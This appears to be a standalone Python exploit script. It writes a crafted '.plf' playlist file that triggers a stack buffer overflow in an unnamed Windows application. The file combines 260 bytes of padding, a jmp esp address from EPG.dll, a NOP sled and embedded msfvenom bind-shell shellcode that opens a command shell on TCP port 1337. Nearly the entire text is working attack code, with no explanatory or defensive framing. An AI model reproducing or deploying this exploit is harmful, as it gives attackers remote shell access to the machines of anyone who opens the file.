#!/usr/bin/env python
import struct

filename="shellcode.plf"
#---------------------------------------------
# Badchars = '\x00\x0a\x1a'
# 0x61657d83 : jmp esp | EPG.dll
#---------------------------------------------
# msfvenom -p windows/shell_bind_tcp LPORT=1337 -b '\x00\x0A\x0D\x1A' -f c
shellcode = (
"\x33\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x35\x6f\xad\xc3\x83\xee\xfc\xe2\xf4\xc9\x87\x2f\xc3\x35\x6f"
"\xcd\x4a\xd0\x5e\x6d\xa7\xbe\x3f\x9d\x48\x67\x63\x26\x91\x21"
"\xe4\xdf\xeb\x3a\xd8\xe7\xe5\x04\x90\x01\xff\x54\x13\xaf\xef"
"\x15\xae\x62\xce\x34\xa8\x4f\x31\x67\x38\x26\x91\x25\xe4\xe7"
"\xff\xbe\x23\xbc\xbb\xd6\x27\xac\x12\x64\xe4\xf4\xe3\x34\xbc"
"\x26\x8a\x2d\x8c\x97\x8a\xbe\x5b\x26\xc2\xe3\x5e\x52\x6f\xf4"
"\xa0\xa0\xc2\xf2\x57\x4d\xb6\xc3\x6c\xd0\x3b\x0e\x12\x89\xb6"
"\xd1\x37\x26\x9b\x11\x6e\x7e\xa5\xbe\x63\xe6\x48\x6d\x73\xac"
"\x10\xbe\x6b\x26\xc2\xe5\xe6\xe9\xe7\x11\x34\xf6\xa2\x6c\x35"
"\xfc\x3c\xd5\x30\xf2\x99\xbe\x7d\x46\x4e\x68\x07\x9e\xf1\x35"
"\x6f\xc5\xb4\x46\x5d\xf2\x97\x5d\x23\xda\xe5\x32\x90\x78\x7b"
"\xa5\x6e\xad\xc3\x1c\xab\xf9\x93\x5d\x46\x2d\xa8\x35\x90\x78"
"\xa9\x3d\x36\xfd\x21\xc8\x2f\xfd\x83\x65\x07\x47\xcc\xea\x8f"
"\x52\x16\xa2\x07\xaf\xc3\x30\x56\x24\x25\x5f\x7f\xfb\x94\x5d"
"\xad\x76\xf4\x52\x90\x78\x94\x5d\xd8\x44\xfb\xca\x90\x78\x94"
"\x5d\x1b\x41\xf8\xd4\x90\x78\x94\xa2\x07\xd8\xad\x78\x0e\x52"
"\x16\x5d\x0c\xc0\xa7\x35\xe6\x4e\x94\x62\x38\x9c\x35\x5f\x7d"
"\xf4\x95\xd7\x92\xcb\x04\x71\x4b\x91\xc2\x34\xe2\xe9\xe7\x25"
"\xa9\xad\x87\x61\x3f\xfb\x95\x63\x29\xfb\x8d\x63\x39\xfe\x95"
"\x5d\x16\x61\xfc\xb3\x90\x78\x4a\xd5\x21\xfb\x85\xca\x5f\xc5"
"\xcb\xb2\x72\xcd\x3c\xe0\xd4\x5d\x76\x97\x39\xc5\x65\xa0\xd2"
"\x30\x3c\xe0\x53\xab\xbf\x3f\xef\x56\x23\x40\x6a\x16\x84\x26"
"\x1d\xc2\xa9\x35\x3c\x52\x16")

junk = "A"
jmp_esp = struct.pack("<I", 0x61657d83)
nops = "\x90"*20
buffer = junk*260 + jmp_esp + nops + shellcode + junk*(1736-len(nops)-len(shellcode))

textfile = open(filename, 'w')
textfile.write(buffer)
textfile.close()